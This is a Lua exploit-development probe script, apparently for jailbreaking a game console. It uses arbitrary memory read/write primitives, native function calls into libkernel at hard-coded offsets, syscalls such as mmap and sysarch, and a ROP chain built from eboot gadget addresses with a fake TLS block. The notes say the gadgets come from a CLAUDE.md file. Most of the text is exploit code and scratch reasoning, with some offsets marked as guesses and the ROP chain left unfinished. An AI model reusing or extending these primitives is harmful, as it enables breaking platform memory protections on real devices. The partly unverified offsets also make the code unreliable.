-- CRASH_CLASS: LOW
-- PROBE 544u: MapDirectMemory — read virt addr via uint64 methods (no memory.*)
--
-- CONFIRMED: memory.read_dword/write_dword/read_qword ALL crash after MapDM
-- CONFIRMED: pure Lua (print, string.format, math) works after MapDM
-- CONFIRMED: Apollo flags (prot=0x33, MAP_NO_COALESCE) don't fix it
--
-- THE PROBLEM: after native.fcall_with_rax(MapDM), any memory.* call crashes
--
-- NEW IDEA: virt_out is a Lua userdata (uint64). After MapDM writes to the
-- C memory at virt_out's address, we need to read those 8 bytes.
-- But virt_out the Lua object still points to the same address.
-- Can we read the VALUE at that address without memory.read_qword?
--
-- Option 1: The uint64 object IS the address, not the value at the address.
--   memory.alloc(8) returns an address. MapDM writes to that address.
--   To read it we MUST use memory.read_qword. There's no uint64 method for this.
--
-- Option 2: What if we make virt_out a Lua string instead?
--   string.rep("\0", 8) creates an 8-byte buffer. But MapDM needs a C pointer.
--
-- Option 3: Use native.read_buffer BEFORE MapDM to set up a read, then...
--   No, native.read_buffer also crashes.
--
-- Option 4: Call MapDM with a KNOWN target address.
--   Set *virt_out = 0x880000000 (a high unmapped region).
--   If MapDM respects the hint, the page appears at 0x880000000.
--   Then we don't need to READ virt_out — we know the address.
--   After MapDM, try memory.write_dword(0x880000000, 0xDEAD)
--   Wait — memory.write_dword also crashes.
--
-- Option 5: Call MapDM from a CHILD THREAD (thr_new).
--   The child thread ROP chain:
--   1. Call AllocDM → get phys addr
--   2. Call MapDM → map at known address
--   3. Write test pattern to mapped page
--   4. Signal main thread via socketpair
--   Main thread reads the mapped page (memory.* works from main thread)
--
-- Option 6: DON'T use native.fcall_with_rax at all.
--   Call MapDM via raw syscall instead. What syscall number is it?
--   sceKernelMapDirectMemory is a SONY WRAPPER, not a direct syscall.
--   It internally calls mmap_dmem (sys 628) which we know REFUSES everything.
--   OR maybe it calls something else?
--
-- Option 7: The problem might be that MapDM internally calls mmap or similar
--   which changes the process address space. After that, the fcall return
--   path is broken because some page got remapped.
--   FIX: Call MapDM with *virt_out pointing to a PRE-MAPPED page.
--   If we mmap a page at 0x880000000 first, then MapDM might replace it
--   without disturbing the heap.
--
-- LET'S TEST: Call MapDM in a child thread (thr_new).
-- The child uses its OWN stack and the main thread native handler is untouched.
-- After the child signals done, main thread reads memory normally.
--
-- SIMPLEST FIRST: just test if make_syscall works after MapDM

print("=== 544u: MapDM + CHILD THREAD ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end

if not libkernel_base then print("FATAL"); return end
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local alloc_fn = libkernel_base + uint64(0x17EF0)
local map_fn = libkernel_base + uint64(0x15020)

-- Eboot gadgets (from CLAUDE.md confirmed)
local eboot_base = uint64(0)
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(to_num(info) + 0x108)
local eb_hi = rd(to_num(info) + 0x10C)
if eb_lo and eb_hi then
    if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
    if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
    eboot_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
    print("eboot=" .. q(eboot_base))
end

-- Step 1: AllocDM from main thread (this works fine)
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
if not ok_a or to_num(arv) ~= 0 then print("ALLOC FAIL"); return end
local phys = rq(phys_out)
print("phys=" .. q(phys))

-- Step 2: Prepare shared memory for MapDM result
-- Use memory.alloc for the virt_out buffer (main thread writes before MapDM)
local virt_out = memory.alloc(16)
wq(virt_out, uint64(0))

-- Step 3: Create socketpair for child→main signaling
local sc_socketpair = make_syscall(135)  -- socketpair
local sv = memory.alloc(8)  -- two int32 fds
local sp_ok = pcall(function()
    sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv))  -- AF_UNIX, SOCK_STREAM
end)
local fd0 = rd(to_num(sv))
local fd1 = rd(to_num(sv) + 4)
print(string.format("sp: ok=%s fd0=%s fd1=%s", tostring(sp_ok), tostring(fd0), tostring(fd1)))

if not fd0 or not fd1 or fd0 < 0 or fd1 < 0 then
    print("SOCKETPAIR FAIL"); return
end

-- Step 4: Build child thread ROP chain
-- Child calls MapDM, writes result to socketpair
-- Gadgets from CLAUDE.md:
local pop_rax_ret = eboot_base + uint64(0x992)
local pop_rdi_ret = eboot_base + uint64(0xC9DFE)
local pop_rsi_ret = eboot_base + uint64(0xD77D)
local pop_rdx_ret = eboot_base + uint64(0x3B02D7)
local pop_rcx_ret = eboot_base + uint64(0xE64)
local bare_ret    = eboot_base + uint64(0x42)
-- mov [rdi], rax; ret — at eboot+0x92C67
local mov_rdi_rax_ret = eboot_base + uint64(0x92C67)
-- syscall; ret gadget
local syscall_ret = eboot_base + uint64(0x4DE)  -- need to verify

-- sysarch(165) for TLS fix: SET_FSBASE=129
local pop_rsi_rbp_ret = eboot_base + uint64(0x78)

-- Child stack: 2MB
local stack_size = 0x200000
local sc_mmap = make_syscall(477)
local child_stack = uint64(0)
pcall(function()
    child_stack = sc_mmap(uint64(0), uint64(stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if to_num(child_stack) == 0 then print("STACK MMAP FAIL"); return end
print("stack=" .. q(child_stack))

-- Fake TCB (4KB self-referencing) for child TLS
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do
    wq(fake_tcb + uint64(i), fake_tcb)
end

-- Build ROP chain on the child stack
-- Stack grows down, RSP starts at top
local stack_top = child_stack + uint64(stack_size)
-- Align to 16 bytes, then -8 for ABI
local rsp_start = uint64(string.format("0x%X", (to_num(stack_top) - 8)))

-- ROP layout on child stack:
-- We write the chain starting from rsp_start going DOWN in memory
-- Actually, ROP chains go UP: pop reads [RSP], RSP += 8
-- So we write starting from rsp_start going UP... wait, that's past the stack.
-- We need to set RSP to BELOW where the chain is.

-- Let's put the chain at stack_base + some offset, and set RSP there
local chain_base = child_stack + uint64(0x1000)  -- 4KB into the stack
local off = 0

local function push_q(val)
    wq(chain_base + uint64(off), val)
    off = off + 8
end

-- ROP Chain for child:
-- 1. sysarch(SET_FSBASE=129, &fake_tcb) — fix TLS
push_q(pop_rax_ret)
push_q(uint64(165))        -- sysarch syscall number
push_q(pop_rdi_ret)
push_q(uint64(129))        -- SET_FSBASE
push_q(pop_rsi_ret)
push_q(fake_tcb)           -- pointer to fake TCB address
-- Actually sysarch(165) takes (int number, void *data)
-- where data points to the base address, not IS the base address
-- Need: sysarch(129, &ptr_to_fake_tcb)
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, fake_tcb)
-- Redo:
off = 0
push_q(pop_rax_ret)
push_q(uint64(165))        -- sysarch
push_q(pop_rdi_ret)
push_q(uint64(129))        -- SET_FSBASE
push_q(pop_rsi_ret)
push_q(tcb_ptr_buf)        -- &fake_tcb_ptr
push_q(bare_ret)           -- need to find syscall;ret gadget

-- Actually I need: pop rax=165, pop rdi=129, pop rsi=&ptr, syscall; ret
-- The syscall;ret gadget — let me check if 0x4DE is right
-- From CLAUDE.md: "pop rax; 431; syscall" for thr_exit... not quite
-- Let me use the sysarch wrapper in libkernel instead via a known gadget

-- SIMPLIFIED: just call MapDM via the libkernel wrapper, not raw syscall
-- The child can call native functions if we set up the stack properly

-- Actually this is getting complex. Let me try a MUCH simpler approach first:
-- What if MapDM corrupts the native handler, but a SECOND call to
-- native.fcall_with_rax fixes it?
-- OR: what if we call memory.read_qword inside a NEW pcall after MapDM?

print("SIMPLE TEST FIRST")

-- MapDM from main thread with Apollo flags
print("MAP...")
local ok_m, mrv = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(0x33),
        uint64(0x400000), phys, uint64(0x4000))
end)

print("ok=" .. tostring(ok_m))
if ok_m then print("rv=" .. to_num(mrv)) end

-- Can we do ANOTHER native.fcall_with_rax call?
-- Try getpid via native (not syscall module)
print("T1:native_after")
local getpid_addr = libkernel_base + uint64(0x10A30) -- guess, may not be getpid
local ok_n2, r_n2 = pcall(function()
    -- Just call AllocDM again with bad args to see if native handler works
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
print("T1:ok=" .. tostring(ok_n2))

-- Try make_syscall
print("T2:make_sc")
local ok_sc, pid_sc = pcall(function()
    local sc = make_syscall(20)
    return sc()
end)
print("T2:ok=" .. tostring(ok_sc))
if ok_sc then print("T2:pid=" .. to_num(pid_sc)) end

-- Try memory ops
print("T3:mem_rd")
local ok_rd = pcall(function() return memory.read_dword(virt_out) end)
print("T3:ok=" .. tostring(ok_rd))

print("=== DONE ===")
